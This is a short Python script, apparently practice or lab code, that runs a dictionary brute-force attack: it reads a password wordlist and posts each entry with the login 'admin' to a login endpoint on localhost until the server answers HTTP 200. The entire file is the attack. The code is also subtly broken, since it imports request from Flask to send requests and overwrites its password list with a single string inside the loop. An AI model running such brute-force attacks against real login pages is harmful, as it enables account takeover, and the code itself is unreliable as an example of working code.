from flask import request

with open('filename') as pass_list:
    s = pass_list.read()
    password = s.split('\n')

index = -1


def get_password():
    '''
    Bruteforce with password dictionary
    :return: password
    '''
    global index

    index += 1
    return password[index]


status_code = 0
while status_code != 200:
    password = get_password()
    r = request.post('http://127.0.0.1:5000/auth', data={'login': 'admin', 'password': password})
    status_code = r.status_code

print(password)
